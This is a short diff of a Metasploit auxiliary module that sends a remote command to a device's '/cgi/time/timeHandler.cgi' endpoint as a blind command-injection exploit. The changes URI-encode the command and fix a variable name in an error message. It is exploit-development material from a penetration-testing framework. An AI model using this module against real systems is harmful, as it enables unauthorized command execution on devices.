@@ -50,7 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		#setting up the needed variables
 		uri = '/cgi/time/timeHandler.cgi'
-		cmd = datastore['CMD']
+		cmd = Rex::Text.uri_encode(datastore['CMD'])
 
 		print_status("#{rhost}:#{rport} - Sending remote command: " + cmd)
 
@@ -83,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 					}
 				})
 		rescue ::Rex::ConnectionError
-			vprint_error("#{rhost}:#{rport} - #{target_url} - Failed to connect to the web server")
+			vprint_error("#{rhost}:#{rport} - #{uri} - Failed to connect to the web server")
 			return
 		end
 		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\n")
